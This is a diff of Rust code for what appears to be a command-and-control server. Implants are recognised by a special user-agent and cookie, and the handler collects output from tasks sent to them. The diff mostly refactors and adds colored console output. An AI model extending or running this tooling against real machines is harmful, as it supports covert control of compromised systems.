@@ -1,4 +1,5 @@
 use actix_web::{web, HttpRequest, HttpResponse, Responder};
+use colored::Colorize;
 use serde::{Deserialize, Serialize};
 use std::sync::{Arc, Mutex};
 use uuid::Uuid;
@@ -49,16 +50,14 @@ fn ua_ok(req: &HttpRequest) -> bool {
     req.headers()
         .get("User-Agent")
         .and_then(|v| v.to_str().ok())
-        .map(|ua| ua == IMPLANT_UA)
-        .unwrap_or(false)
+        .is_some_and(|ua| ua == IMPLANT_UA)
 }
 
 fn cookie_ok(req: &HttpRequest) -> bool {
     req.headers()
         .get("Cookie")
         .and_then(|v| v.to_str().ok())
-        .map(|c| c.contains("banner=banner"))
-        .unwrap_or(false)
+        .is_some_and(|c| c.contains("banner=banner"))
 }
 
 // ── Handlers ────────────────────────────────────────────────────────────────
@@ -124,29 +123,45 @@ pub async fn stage3_handler(
         return HttpResponse::NotFound().finish();
     }
 
-    let x_req_id = req
+    let Some(x_req_id) = req
         .headers()
         .get("x-request-id")
         .and_then(|v| v.to_str().ok())
-        .and_then(|s| Uuid::parse_str(s).ok());
-
-    let x_req_id = match x_req_id {
-        Some(id) => id,
-        None => return HttpResponse::BadRequest().finish(),
+        .and_then(|s| Uuid::parse_str(s).ok())
+    else {
+        return HttpResponse::BadRequest().finish();
     };
 
     let mut links = data.links.lock().unwrap();
 
-    let link_id = match links.find_by_request_id(x_req_id) {
-        Some(l) => l.id,
-        None => return HttpResponse::NotFound().finish(),
+    let Some(link_id) = links.find_by_request_id(x_req_id).map(|l| l.id) else {
+        return HttpResponse::NotFound().finish();
     };
 
     // Submit output from previous task
     if !body.tasking.is_empty() {
         if let Ok(task_id) = Uuid::parse_str(&body.tasking) {
             if !body.q.is_empty() {
+                let (link_name, cli_cmd) = links
+                    .get_link(link_id)
+                    .map(|l| {
+                        let cmd = l
+                            .tasks
+                            .iter()
+                            .find(|t| t.id == task_id)
+                            .map(|t| t.cli_command.clone())
+                            .unwrap_or_default();
+                        (l.name.clone(), cmd)
+                    })
+                    .unwrap_or_else(|| ("unknown".into(), String::new()));
+
+                const OUTPUT_BOX_WIDTH: usize = 54;
+                let now = chrono::Local::now().format("%H:%M:%S");
+                let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
+                let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
+                println!("\n{}", format!("╔{}{}╗", header_text, "═".repeat(pad)).cyan().bold());
                 println!("{}", body.q);
+                println!("{}\n", format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold());
             }
             links.complete_task(link_id, task_id, body.q.clone());
         }
